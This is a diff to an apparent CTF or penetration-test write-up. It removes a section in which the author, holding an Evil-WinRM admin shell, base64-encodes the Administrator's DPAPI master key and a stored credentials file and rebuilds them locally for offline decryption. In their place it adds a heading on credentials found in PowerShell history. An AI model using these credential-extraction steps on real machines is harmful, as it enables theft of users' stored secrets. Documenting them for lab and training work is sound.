@@ -1050,32 +1050,7 @@ Info: Establishing connection to remote endpoint
 
 I now have access as the local admin!
 
-# Extracting DPAPI credentials!
-
-```python
-*Evil-WinRM* PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1126153559-1564084538-3464706030-500> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-1126153559-1564084538-3464706030-500\4b4b0fdb-84b6-478f-b08e-a473a4473897"))
-AgAAAAAAAAAAAAAANABiADQAYgAwAGYAZABiAC0AOAA0AGIANgAtADQANwA4AGYALQBiADAAOABlAC0AYQA0ADcAMwBhADQANAA3ADMAOAA5ADcAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAA2UIQ2DYT+X5ylSZfHnXXgUAfAAAOgAAAEGYAALTXYGPOYRw9SYJBQ0I7EYJNEN7HAkypCe7rweR8pXHUI6hFzkUFH6Gzh7MpIl5RG2Y8f2NoEx/qh6onJEu9CuwkjIbi8rHpPhVTLmoTN/IB0cf5wyWoMMkUlvXWamWQISV5mp651PUDpN9e+5LfG/56bvX6Rd4r6H9QnGvbWpxQ2Tmf/I+JSrb7hvNMnVS6/QIAAAAha2PmY8m7QQs1KG5Qb/aMQB8AAA6AAAAQZgAArbPfUuIMF9Mz5xwKeLIK0abrA08V1uUryGk/nlL5zXXzPoG8glHp9FvgilAdsNe5jPkD+bLZZFsV919Vd1rc46ITlG80YJV2p6O+ervRC452/Y1H6+laL7dC/MCnxg9ICkxn8AYYvsVAsAFHqfYczAMAAAAkoyX4Spr2QLdYGaSnFE4c
-```
-
-So i cannot download the key file, so ill encode its output then save it to my machine that way
-
-```python
-echo "AgAAAAAAAAAAAAAANABiADQAYgAwAGYAZABiAC0AOAA0AGIANgAtADQANwA4AGYALQBiADAAOABlAC0AYQA0ADcAMwBhADQANAA3ADMAOAA5ADcAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAA2UIQ2DYT+X5ylSZfHnXXgUAfAAAOgAAAEGYAALTXYGPOYRw9SYJBQ0I7EYJNEN7HAkypCe7rweR8pXHUI6hFzkUFH6Gzh7MpIl5RG2Y8f2NoEx/qh6onJEu9CuwkjIbi8rHpPhVTLmoTN/IB0cf5wyWoMMkUlvXWamWQISV5mp651PUDpN9e+5LfG/56bvX6Rd4r6H9QnGvbWpxQ2Tmf/I+JSrb7hvNMnVS6/QIAAAAha2PmY8m7QQs1KG5Qb/aMQB8AAA6AAAAQZgAArbPfUuIMF9Mz5xwKeLIK0abrA08V1uUryGk/nlL5zXXzPoG8glHp9FvgilAdsNe5jPkD+bLZZFsV919Vd1rc46ITlG80YJV2p6O+ervRC452/Y1H6+laL7dC/MCnxg9ICkxn8AYYvsVAsAFHqfYczAMAAAAkoyX4Spr2QLdYGaSnFE4c" | base64 -d > key
-```
-
-Now the key is saved to my machine 
-
-```python
-*Evil-WinRM* PS C:\Users\Administrator\AppData\Local\Microsoft\Credentials> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))
-```
-
-Then ill do the same thing with the credentials file!
-
-```python
-echo 'base64_encoded_string' | base64 -d > credential
-```
-
-Now i have both files on my machine, i can decode it offline
+# Credentials stored in powershell history
 
 ```python
 
